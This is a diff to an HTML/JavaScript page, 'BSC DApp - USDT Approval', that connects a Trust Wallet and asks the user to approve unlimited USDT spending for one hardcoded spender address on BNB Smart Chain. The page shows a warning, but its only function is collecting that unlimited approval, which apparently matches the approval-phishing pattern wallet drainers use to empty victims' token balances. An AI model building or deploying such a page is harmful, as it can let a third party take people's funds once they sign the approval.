@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BSC DApp Connector</title>
+    <title>BSC DApp - USDT Approval</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -13,7 +13,7 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
             padding: 20px;
             text-align: center;
@@ -23,15 +23,21 @@
             background-color: #1e1e1e;
             padding: 30px;
             border-radius: 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.6);
             width: 100%;
-            max-width: 400px;
+            max-width: 420px;
         }
 
         h1 {
             font-size: 1.5rem;
-            margin-bottom: 20px;
-            color: #F0B90B; /* Binance Yellow */
+            margin-bottom: 5px;
+            color: #F0B90B;
+        }
+
+        .subtitle {
+            color: #888;
+            font-size: 0.85rem;
+            margin-bottom: 25px;
         }
 
         .status-box {
@@ -40,11 +46,23 @@
             border-radius: 8px;
             margin-bottom: 20px;
             word-break: break-all;
-            font-size: 0.9rem;
-            min-height: 60px;
+            font-size: 0.85rem;
+            min-height: 50px;
             display: flex;
             align-items: center;
             justify-content: center;
+            text-align: left;
+            line-height: 1.4;
+        }
+
+        .status-box.success {
+            border: 1px solid #4caf50;
+            color: #4caf50;
+        }
+
+        .status-box.error {
+            border: 1px solid #ff5252;
+            color: #ff5252;
         }
 
         .info-row {
@@ -53,33 +71,66 @@
             margin-bottom: 10px;
             font-size: 0.9rem;
             color: #b0b0b0;
+            padding: 8px 0;
+            border-bottom: 1px solid #333;
         }
 
         .info-val {
             color: #fff;
             font-weight: bold;
+            text-align: right;
+            max-width: 60%;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .section-title {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #666;
+            margin: 20px 0 10px 0;
+            text-align: left;
         }
 
         button {
             background-color: #F0B90B;
             color: #000;
             border: none;
-            padding: 15px 30px;
+            padding: 15px 25px;
             border-radius: 8px;
             font-size: 1rem;
             font-weight: bold;
             cursor: pointer;
             width: 100%;
-            transition: background-color 0.2s;
+            transition: all 0.2s;
+            margin-top: 10px;
         }
 
         button:hover {
             background-color: #d1a008;
+            transform: translateY(-1px);
+        }
+
+        button:active {
+            transform: translateY(0);
         }
 
         button:disabled {
-            background-color: #555;
+            background-color: #444;
+            color: #888;
             cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-secondary {
+            background-color: #333;
+            color: #fff;
+            margin-top: 10px;
+        }
+
+        .btn-secondary:hover {
+            background-color: #444;
         }
 
         .loader {
@@ -97,36 +148,94 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+
+        .tx-hash {
+            font-size: 0.75rem;
+            color: #F0B90B;
+            text-decoration: none;
+            word-break: break-all;
+        }
+
+        .tx-hash:hover {
+            text-decoration: underline;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .warning-text {
+            font-size: 0.75rem;
+            color: #ff9800;
+            margin-top: 10px;
+            text-align: left;
+            line-height: 1.4;
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
         <h1>BSC DApp</h1>
+        <div class="subtitle">USDT Approval Tool</div>
         
-        <div class="info-row">
-            <span>Network:</span>
-            <span id="network" class="info-val">Checking...</span>
+        <!-- Connection Status -->
+        <div class="status-box" id="connectionStatus">
+            Checking wallet...
         </div>
 
-        <div class="status-box" id="status">
-            Initializing...
-        </div>
-
-        <div id="walletInfo" style="display:none; margin-bottom: 20px; border-top: 1px solid #333; padding-top: 15px;">
+        <!-- Wallet Info Section -->
+        <div id="walletSection" class="hidden">
+            <div class="section-title">Wallet Information</div>
+            <div class="info-row">
+                <span>Network:</span>
+                <span id="network" class="info-val">BSC Mainnet</span>
+            </div>
             <div class="info-row">
                 <span>Address:</span>
                 <span id="address" class="info-val">...</span>
             </div>
             <div class="info-row">
-                <span>Balance:</span>
+                <span>BNB Balance:</span>
                 <span id="balance" class="info-val">...</span>
             </div>
         </div>
 
+        <!-- Approval Section -->
+        <div id="approvalSection" class="hidden">
+            <div class="section-title">Token Approval</div>
+            
+            <div class="info-row">
+                <span>Token:</span>
+                <span class="info-val">USDT (BSC)</span>
+            </div>
+            <div class="info-row">
+                <span>Amount:</span>
+                <span class="info-val" style="color: #4caf50;">∞ Unlimited</span>
+            </div>
+            <div class="info-row">
+                <span>Spender:</span>
+                <span class="info-val">0x8911...Ae98</span>
+            </div>
+
+            <div class="warning-text">
+                ⚠️ Unlimited approval allows the contract to spend your USDT anytime. Only approve if you trust the contract.
+            </div>
+
+            <div class="status-box" id="approvalStatus" style="min-height: 30px; margin-top: 15px;">
+                Ready to approve
+            </div>
+
+            <button id="approveBtn" onclick="approveUSDT()">
+                <span id="approveBtnText">Approve Unlimited USDT</span>
+                <div class="loader" id="approveLoader"></div>
+            </button>
+        </div>
+
+        <!-- Connect Button (shown when not connected) -->
         <button id="connectBtn" onclick="connectWallet()">
-            <span id="btnText">Connect Wallet</span>
-            <div class="loader" id="loader"></div>
+            <span id="connectBtnText">Connect Wallet</span>
+            <div class="loader" id="connectLoader"></div>
         </button>
     </div>
 
@@ -134,6 +243,18 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.11.1/ethers.umd.min.js"></script>
 
     <script>
+        // ==================== CONFIGURATION ====================
+        
+        // USDT Contract on BSC Mainnet
+        const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+        
+        // Your Contract Address (Spender)
+        const SPENDER_ADDRESS = "0x89112691C976D0a2D874B0ADAe693a0Add0dAe98";
+        
+        // APPROVAL AMOUNT: Unlimited (Max Uint256)
+        // This is the maximum value allowed by the ERC-20 standard
+        const APPROVAL_AMOUNT = ethers.MaxUint256;
+
         // BSC Mainnet Configuration
         const BSC_MAINNET = {
             chainId: '0x38', // 56 in hex
@@ -147,31 +268,51 @@
             blockExplorerUrls: ['https://bscscan.com/']
         };
 
+        // USDT ABI (Minimal - only approve function)
+        const USDT_ABI = [
+            "function approve(address spender, uint256 amount) external returns (bool)"
+        ];
+
+        // ==================== STATE ====================
         let provider;
         let signer;
+        let usdtContract;
 
-        // Run on page load
-        window.onload = () => {
+        // ==================== INITIALIZATION ====================
+        window.onload = async () => {
             if (window.ethereum) {
-                // Trust Wallet is detected
                 initProvider();
-                // Attempt auto-connect
-                connectWallet();
+                checkConnection();
             } else {
-                document.getElementById('status').innerText = "No Web3 wallet found. Open in Trust Wallet.";
-                document.getElementById('connectBtn').disabled = true;
+                updateConnectionStatus("No Web3 wallet found. Open in Trust Wallet.", false);
+                disableConnectButton();
             }
         };
 
-        async function initProvider() {
+        function initProvider() {
             provider = new ethers.BrowserProvider(window.ethereum);
         }
 
+        // ==================== CONNECTION FUNCTIONS ====================
+        async function checkConnection() {
+            try {
+                // Check if already authorized
+                const accounts = await provider.listAccounts();
+                if (accounts.length > 0) {
+                    await onWalletConnected(accounts[0].address);
+                } else {
+                    updateConnectionStatus("Click 'Connect Wallet' to start");
+                }
+            } catch (error) {
+                console.error("Connection check failed:", error);
+                updateConnectionStatus("Ready to connect");
+            }
+        }
+
         async function connectWallet() {
-            const statusEl = document.getElementById('status');
-            const btnText = document.getElementById('btnText');
-            const loader = document.getElementById('loader');
-            const walletInfo = document.getElementById('walletInfo');
+            const statusEl = document.getElementById('connectionStatus');
+            const btnText = document.getElementById('connectBtnText');
+            const loader = document.getElementById('connectLoader');
 
             // UI Loading State
             btnText.style.display = 'none';
@@ -179,81 +320,164 @@
             document.getElementById('connectBtn').disabled = true;
 
             try {
-                // 1. Request Account Access
-                // Note: Browsers may block this if not triggered by user click, 
-                // but we try because the user might have previously authorized.
+                // Request account access
                 await provider.send("eth_requestAccounts", []);
                 
                 signer = await provider.getSigner();
                 const address = await signer.getAddress();
-                const network = await provider.getNetwork();
 
-                // 2. Check if connected to BSC (Chain ID 56)
-                // Ethers v6 returns BigInt for chainId
-                const chainId = network.chainId;
-                const BSC_CHAIN_ID = 56n;
+                // Check and switch network
+                await ensureBSCNetwork();
 
-                if (chainId !== BSC_CHAIN_ID) {
-                    statusEl.innerText = "Wrong network detected. Switching to BSC...";
-                    await switchToBSC();
-                    // Refresh provider data after switch
-                    await provider.getNetwork(); 
-                }
-
-                // 3. Fetch Balance
-                const balance = await provider.getBalance(address);
-                const formattedBalance = ethers.formatEther(balance);
-
-                // 4. Update UI
-                document.getElementById('network').innerText = "BSC Mainnet";
-                document.getElementById('network').style.color = "#F0B90B";
-                document.getElementById('address').innerText = `${address.substring(0, 6)}...${address.substring(38)}`;
-                document.getElementById('balance').innerText = `${formattedBalance} BNB`;
-                
-                statusEl.innerText = "Connected Successfully";
-                statusEl.style.color = "#4caf50";
-                walletInfo.style.display = "block";
+                // Success
+                await onWalletConnected(address);
 
             } catch (error) {
                 console.error(error);
+                let message = "Connection failed";
+                
                 if (error.code === 4001) {
-                    statusEl.innerText = "Connection rejected by user.";
-                } else {
-                    statusEl.innerText = "Error: " + (error.message || "Unknown error");
+                    message = "Connection rejected by user";
+                } else if (error.code === -32002) {
+                    message = "Request already pending. Check Trust Wallet.";
                 }
-                statusEl.style.color = "#ff5252";
-            } finally {
-                // Reset Button UI
+                
+                updateConnectionStatus(message, false);
+                
+                // Reset button
                 btnText.style.display = 'inline';
                 loader.style.display = 'none';
                 document.getElementById('connectBtn').disabled = false;
             }
         }
 
-        async function switchToBSC() {
+        async function ensureBSCNetwork() {
             const { ethereum } = window;
-            
-            try {
-                // Try to switch to BSC
-                await ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: BSC_MAINNET.chainId }],
-                });
-            } catch (switchError) {
-                // This error code indicates that the chain has not been added to MetaMask/TWallet.
-                if (switchError.code === 4902) {
-                    try {
-                        await ethereum.request({
-                            method: 'wallet_addEthereumChain',
-                            params: [BSC_MAINNET],
-                        });
-                    } catch (addError) {
-                        throw new Error("Failed to add BSC Network");
+            const network = await provider.getNetwork();
+            const chainId = network.chainId;
+            const BSC_CHAIN_ID = 56n;
+
+            if (chainId !== BSC_CHAIN_ID) {
+                updateConnectionStatus("Wrong network. Switching to BSC...", false);
+                
+                try {
+                    // Try to switch
+                    await ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: BSC_MAINNET.chainId }],
+                    });
+                } catch (switchError) {
+                    // Chain not added, try to add it
+                    if (switchError.code === 4902) {
+                        try {
+                            await ethereum.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [BSC_MAINNET],
+                            });
+                        } catch (addError) {
+                            throw new Error("Failed to add BSC Network");
+                        }
+                    } else {
+                        throw new Error("Failed to switch to BSC");
                     }
-                } else {
-                    throw new Error("Failed to switch to BSC");
                 }
             }
+        }
+
+        async function onWalletConnected(address) {
+            // Update connection status
+            updateConnectionStatus("Wallet Connected", true);
+            
+            // Show wallet section
+            document.getElementById('walletSection').classList.remove('hidden');
+            document.getElementById('approvalSection').classList.remove('hidden');
+            document.getElementById('connectBtn').classList.add('hidden');
+
+            // Update wallet info
+            document.getElementById('address').innerText = formatAddress(address);
+            
+            // Get balance
+            const balance = await provider.getBalance(address);
+            document.getElementById('balance').innerText = `${parseFloat(ethers.formatEther(balance)).toFixed(4)} BNB`;
+
+            // Initialize USDT contract
+            usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
+        }
+
+        // ==================== APPROVAL FUNCTION ====================
+        async function approveUSDT() {
+            const statusEl = document.getElementById('approvalStatus');
+            const btn = document.getElementById('approveBtn');
+            const btnText = document.getElementById('approveBtnText');
+            const loader = document.getElementById('approveLoader');
+
+            // Reset status
+            statusEl.classList.remove('success', 'error');
+            statusEl.innerHTML = "Initiating approval...";
+
+            // UI Loading State
+            btnText.style.display = 'none';
+            loader.style.display = 'block';
+            btn.disabled = true;
+
+            try {
+                statusEl.innerHTML = "Please confirm in Trust Wallet...";
+
+                // Send approval transaction (Unlimited)
+                const tx = await usdtContract.approve(SPENDER_ADDRESS, APPROVAL_AMOUNT);
+
+                statusEl.innerHTML = `Transaction submitted!<br>Hash: <a href="https://bscscan.com/tx/${tx.hash}" target="_blank" class="tx-hash">${tx.hash.substring(0, 10)}...${tx.hash.substring(62)}</a>`;
+
+                // Wait for confirmation
+                statusEl.innerHTML = `Waiting for confirmation...<br>(This may take a few seconds)`;
+
+                await tx.wait();
+
+                // Success!
+                statusEl.innerHTML = `✅ <strong>Success!</strong><br>Unlimited USDT approved for ${formatAddress(SPENDER_ADDRESS)}`;
+                statusEl.classList.add('success');
+
+            } catch (error) {
+                console.error("Approval error:", error);
+                
+                let errorMsg = "Approval failed";
+                
+                if (error.code === 4001) {
+                    errorMsg = "Transaction rejected in wallet";
+                } else if (error.code === -32603) {
+                    errorMsg = "Insufficient BNB for gas fees";
+                } else if (error.message) {
+                    // Extract shorter message
+                    const shortMsg = error.message.substring(0, 50);
+                    errorMsg = shortMsg + (error.message.length > 50 ? "..." : "");
+                }
+
+                statusEl.innerHTML = `❌ ${errorMsg}`;
+                statusEl.classList.add('error');
+            } finally {
+                // Reset button UI
+                btnText.style.display = 'inline';
+                loader.style.display = 'none';
+                btn.disabled = false;
+            }
+        }
+
+        // ==================== UTILITY FUNCTIONS ====================
+        function updateConnectionStatus(message, isSuccess) {
+            const statusEl = document.getElementById('connectionStatus');
+            statusEl.innerText = message;
+            statusEl.className = 'status-box' + (isSuccess ? ' success' : '');
+        }
+
+        function formatAddress(address) {
+            return `${address.substring(0, 6)}...${address.substring(38)}`;
+        }
+
+        function disableConnectButton() {
+            const btn = document.getElementById('connectBtn');
+            btn.disabled = true;
+            btn.style.backgroundColor = '#555';
+            btn.innerText = "Wallet Not Found";
         }
     </script>
 </body>
